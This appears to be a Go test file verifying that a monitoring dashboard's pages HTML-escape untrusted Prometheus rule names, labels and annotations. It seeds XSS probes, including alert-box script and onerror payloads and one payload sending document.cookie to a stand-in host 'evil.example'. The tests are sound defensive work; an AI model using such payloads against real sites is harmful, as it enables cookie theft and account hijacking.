package server

import (
	"html"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/SaiPisey2/noisefloor/internal/coverage"
	"github.com/SaiPisey2/noisefloor/internal/score"
	"github.com/SaiPisey2/noisefloor/internal/store"
)

// scriptPayload and onerrorPayload are the two classic XSS probes: a
// script tag, and an event-handler attribute break-out. Everything this
// server renders that ultimately came from someone's Prometheus -- a rule
// name, a label value, an annotation, a PromQL expression -- is free text
// somebody else wrote, and none of it should reach the page unescaped.
const (
	scriptPayload  = `<script>alert(1)</script>`
	onerrorPayload = `" onerror="alert(2)`
)

// assertEscaped fails t if raw appears verbatim in body (it must not, in
// any HTML context) and if body does not also contain SOME escaped
// rendering of it -- otherwise a test that merely never included the
// payload at all would pass for the wrong reason.
func assertEscaped(t *testing.T, body, raw, label string) {
	t.Helper()
	if strings.Contains(body, raw) {
		t.Errorf("%s: raw unescaped payload %q found in rendered page:\n%s", label, raw, body)
	}
	if want := html.EscapeString(raw); !strings.Contains(body, want) {
		t.Errorf("%s: expected the escaped rendering %q of payload %q somewhere in the page, found none:\n%s",
			label, want, raw, body)
	}
}

func TestLeaderboardEscapesUntrustedInput(t *testing.T) {
	db := newTestDB(t)
	srv := newTestServer(t, db)

	id := seedRule(t, db, store.Rule{
		AlertName: scriptPayload, GroupName: onerrorPayload, Active: true,
	})
	seedEpisode(t, db, id, store.StateFiring, fixedNow.Add(-time.Hour), time.Minute)
	seedScore(t, db, id, store.Score{
		Verdict: score.VerdictKeep, NoiseScore: 1,
		Signals: map[string]float64{"fires": 1},
	})

	body := get(t, srv.Handler(), "/").Body.String()
	assertEscaped(t, body, scriptPayload, "alert name")
	assertEscaped(t, body, onerrorPayload, "group name")
}

func TestRuleDetailEscapesUntrustedInput(t *testing.T) {
	db := newTestDB(t)
	srv := newTestServer(t, db)

	id := seedRule(t, db, store.Rule{
		AlertName: scriptPayload,
		GroupName: "g",
		Active:    true,
		Expr:      `up{job="` + scriptPayload + `"} == 0`,
		Labels:    map[string]string{"team": onerrorPayload},
		Annotations: map[string]string{
			"summary": `<img src=x onerror=alert(3)>`,
		},
	})
	seedEpisode(t, db, id, store.StateFiring, fixedNow.Add(-time.Hour), time.Minute)
	seedScore(t, db, id, store.Score{
		Verdict: score.VerdictKeep, NoiseScore: 1,
		Signals: map[string]float64{"fires": 1},
	})

	body := get(t, srv.Handler(), "/rules/"+strconv.FormatInt(id, 10)).Body.String()
	assertEscaped(t, body, scriptPayload, "alert name / expr")
	assertEscaped(t, body, onerrorPayload, "label value")
	assertEscaped(t, body, `<img src=x onerror=alert(3)>`, "annotation value")
}

func TestRuleDetailEscapesUntrustedInputInTimelineTooltip(t *testing.T) {
	// The episode-timeline tooltip's title text is built from the episode's
	// state and timestamps, not free text -- but the surrounding rule name
	// in the page title and heading is exactly the kind of value an XSS
	// probe targets, and this exercises it once more from a script-heavy
	// annotation to make sure a longer payload doesn't slip past escaping
	// at the point it's split across HTML tag boundaries in the source.
	db := newTestDB(t)
	srv := newTestServer(t, db)

	payload := `</title><script>document.location='https://evil.example/'+document.cookie</script>`
	id := seedRule(t, db, store.Rule{AlertName: payload, GroupName: "g", Active: true})
	seedEpisode(t, db, id, store.StateFiring, fixedNow.Add(-time.Hour), time.Minute)

	body := get(t, srv.Handler(), "/rules/"+strconv.FormatInt(id, 10)).Body.String()
	if strings.Contains(body, "<script>document.location") {
		t.Errorf("script payload reached the page unescaped:\n%s", body)
	}
}

func TestCoverageEscapesUntrustedInput(t *testing.T) {
	db := newTestDB(t)
	srv := newTestServer(t, db)

	snap := coverage.Snapshot{
		ComputedAt: fixedNow,
		Grid: []coverage.ServiceCoverage{{
			Service: coverage.Service{Name: scriptPayload, Source: "job"},
			Covered: map[coverage.Signal][]coverage.RuleMatch{
				coverage.SignalRate: {{
					GroupName: "g", AlertName: onerrorPayload, Signal: coverage.SignalRate,
					Certain: true, Scope: "matched",
					Reason: `reason with "quotes" and <tags>`,
				}},
			},
		}},
		Unattributed: []string{scriptPayload},
	}
	seedCoverageSnapshot(t, db, snap)

	body := get(t, srv.Handler(), "/coverage").Body.String()
	assertEscaped(t, body, scriptPayload, "service name / unattributed rule")
	assertEscaped(t, body, onerrorPayload, "rule match alert name (tooltip attribute)")
}
